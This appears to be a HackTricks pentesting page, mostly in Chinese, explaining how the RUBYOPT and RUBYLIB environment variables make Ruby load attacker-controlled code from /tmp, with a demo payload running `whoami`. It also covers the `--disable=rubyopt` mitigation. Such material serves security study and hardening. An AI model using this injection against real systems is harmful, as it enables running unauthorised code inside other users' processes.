# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby 会在运行脚本前，从 `RUBYOPT` 环境变量中解析受支持的命令行选项。Ruby 会拒绝通过 `RUBYOPT` 中的 `-e` 执行代码，但 `-I` 可以添加库搜索目录，`-r` 可以加载库。因此，启动 Ruby 时使用攻击者可控环境变量的进程，可能被诱导加载攻击者控制的 Ruby 代码。<sup>[[1]](#references)</sup>

创建 `/tmp/inject.rb`：
```ruby:inject.rb
puts `whoami`
```
创建一个无害的 Ruby 脚本，例如 `hello.rb`：
```ruby:hello.rb
puts 'Hello, World!'
```
使用受控的 `RUBYOPT` 值运行它：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
要禁用此行为，请在脚本名称**之前**传递 `--disable=rubyopt`（或 `--disable-rubyopt`）：<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
写在 `hello.rb` 后面的选项会通过 `ARGV` 传递给脚本；它不会禁用 Ruby 对 `RUBYOPT` 的预先处理。<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

不同于在 `RUBYOPT` 中使用 `-I` 预先添加加载目录，独立的 `RUBYLIB` 环境变量会将目录添加到 Ruby 的 `$LOAD_PATH`。结合 `RUBYOPT=-r<module>`，无需在 `RUBYOPT` 中使用 `-I` 即可加载 attacker code：<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Ruby documentation - Ruby 命令行选项](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
